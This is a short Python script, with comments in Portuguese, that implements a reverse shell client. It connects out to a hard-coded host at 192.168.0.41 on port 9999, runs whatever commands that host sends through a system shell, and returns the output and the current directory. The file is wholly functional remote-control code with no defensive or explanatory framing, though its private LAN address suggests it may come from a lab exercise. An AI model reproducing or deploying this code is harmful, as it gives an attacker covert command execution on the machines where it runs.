import os
import socket
import subprocess

# controle aqui se entende por controle do sistema operacional

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '192.168.0.41'
port = 9999
s.connect((host, port))

# quando o server para, esse looping também para
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)

# ENCERRANDO A CONEXAO
s.close()

